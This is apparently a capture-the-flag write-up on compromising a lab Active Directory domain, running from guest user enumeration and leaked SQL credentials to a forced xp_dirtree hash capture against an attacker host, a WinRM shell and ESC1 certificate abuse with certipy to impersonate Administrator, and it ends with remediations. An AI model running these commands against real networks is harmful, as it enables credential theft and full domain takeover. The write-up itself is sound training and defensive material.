
**OS:** Linux/Windows  
**Date:** 16th of August

## Executive summary
In this scenario, there is a Active Directory environment that has the Guest user enabled that allowed the attacker to enumerate users and also access a public share that had mssql credentials on it. With these credentials, the attacker was able to get shell access with the sql_svc user over windows remote management (winrm). In the logs, the user ryan.cooper had attempted to authenticate with credentials and these could be used to authenticate ryan.cooper as well.  This user had permissions to exploit a certification template vulnerability which gave the hash for the Administrator user which compromised the whole domain.

Suggested remediations are:
1. Deactivate the guest user
2. Remove credentials from files
3. Rotate passwords for compromised users
4. Fix the certificate vulnerability (https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation under ESC1 - 4. Mitigations)


## Initial setup
First, we connect over VPN where the target is located. 

We then create our folder and start it:
```
mkdir Foldername && cd Foldername
```

In each terminal we are using, we also set the environment variable for ip-address. This makes it easier to fetch commands from our knowledge vault and also reduces typos:

```
export target=IP
```

We then ping the target to ensure we are able to reach it:

```
ping $target
```

After getting domain creds after authenticating:

netexec smb $target --generate-hosts-file hosts
netexec smb $target --generate-krb5-file krb5
echo "IPADDRESS     DC01.DOMAIN DOMAIN DC01" | sudo tee -a /etc/hosts
sudo mv krb5 /etc/krb5.conf
## Enumeration
Our initial scans yields these open ports at the target host:

![267](Images/Pasted%20image%2020260816083444.png)
  
We attempt some low hanging fruit with testing anonymous and guest access over smb, ldap and rpc. We are able to get a list of all users with the guest account over smb, so we route the output into a usable format with this:

```
netexec smb $target -u 'Guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '' -f2 | tee users.txt
```

![521](Images/Pasted%20image%2020260816084101.png)

![](Images/Pasted%20image%2020260816084120.png)

We remove and replace trailing "sequel\" and we have a userlist. Let's validate with kerbrute:

![451](Images/Pasted%20image%2020260816084335.png)

As we see, the usernames are valid. Let's check asreproasting:

![](Images/Pasted%20image%2020260816084552.png)

No user has pre-authentication disabled and the system is not vulnerable to asreproasting.
There was a non-standard share we had read access to, let's dig into that one:

![590](Images/Pasted%20image%2020260816085217.png)

![](Images/Pasted%20image%2020260816085238.png)

We find a pdf containing information on SQL server procedures. It tells us how to access the database from a non-domain joined machine and also lists credentials for that purpose. 

![418](Images/Pasted%20image%2020260816085601.png)

We attempt to authenticate to the sql service:

![](Images/Pasted%20image%2020260816092545.png)


## Exploitation

  It works, so we can now likely read the contents of the database. After poking around for awhile, nothing immediately interesting comes up. We can attempt to use Responder to fetch a hash by forcing a interaction. First we set up responder with a listener:
```
sudo responder -I tun0 -A -v
```

Then, on the victim on SQL, we run:

```
xp_dirtree \\ATTACKER-IP\shares
```

When we do, we get the hash for the sql_svc user:

![423](Images/Pasted%20image%2020260816104014.png)

With the hash, we can attempt offline cracking with john:

![](Images/Pasted%20image%2020260816104203.png)

Which nets us the password for sql_svc. 

We attempt to authenticate with these credentials to open services. With smb, we get read permissions to more shares, but nothing immediately interesting. We check with winrm:

![](Images/Pasted%20image%2020260816104531.png)

We see that we are able to spawn a shell with this user, so we go about doing that with
```
evil-winrm -u sql_svc -p 'RE******' -i $target
```


![452](Images/Pasted%20image%2020260816104803.png)

After having done so, we check privileges. Nothing screaming at us yet, so we attempt to use PowerUp to check for an automated win. 

![](Images/Pasted%20image%2020260816105800.png)

Nothing immediately interesting there either. Next steps would be to check Kerberoasting, winpeas, certificates or Bloodhound for paths to privilege escalation.

Kerberoasting has no entries, certipy does not find something of immediate use so we go ahead and spin an instance of bloodhound up. After fetching the file with the sql_svc user, we load it into Bloodhound and mark sql_user and guest as owned:

![395](Images/Pasted%20image%2020260816111657.png)

We can then run queries to see if there is a path to domain admin. There is no path immediately available to us. We could further enumerate the database or attempt to find something in the directory of the sql_svc user. We look at the logs of the sql_svc user and find a possible credential which has been attempted but failed:

![](Images/Pasted%20image%2020260816113504.png)

It seems Ryan has attempted both his username and password as the username. Most likely these are Ryans credentials but to be thorough we can password spray it with other users:

![](Images/Pasted%20image%2020260816113646.png)

As we see, we have shell with winrm here. We also check smb, but no further shares are available than the ones we already have. Since we can spawn a shell, we set the ryan.cooper use to owned in Bloodhound for later. We spawn a shell and see if we find a flag:

![473](Images/Pasted%20image%2020260816114126.png)

We do. We still want to get more privileges, so we attempt to do PowerUp with this user as well. Nothin interesting, so we check certipy with the ryan.cooper user as well:

![](Images/Pasted%20image%2020260816130603.png)

It says that it is vulnerable to ESC1, so we can attempt that. We can see a walkthrough of all the different attacks here: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation


## Post-Exploitation (Privilege Escalation)

The ESC1 is very straightforward. 

First we run: 
```
certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'Nu******' -dc-ip $target -target 'dc.sequel.htb' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'Administrator@sequel.htb'
```

![493](Images/Pasted%20image%2020260816132159.png)

We can now do this to request the tgt of the administrator:
```
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target
```


Since time skew cannot differ too much, we use faketime from our attacker to bypass this issue by first to get the victim time:
```
sudo rdate -n $target
```
which nets us the target time and then we wrap it in the command shown above (adding some seconds to align time):

![](Images/Pasted%20image%2020260816132523.png)

We can now pass the hash to get domain control:

![](Images/Pasted%20image%2020260816132944.png)

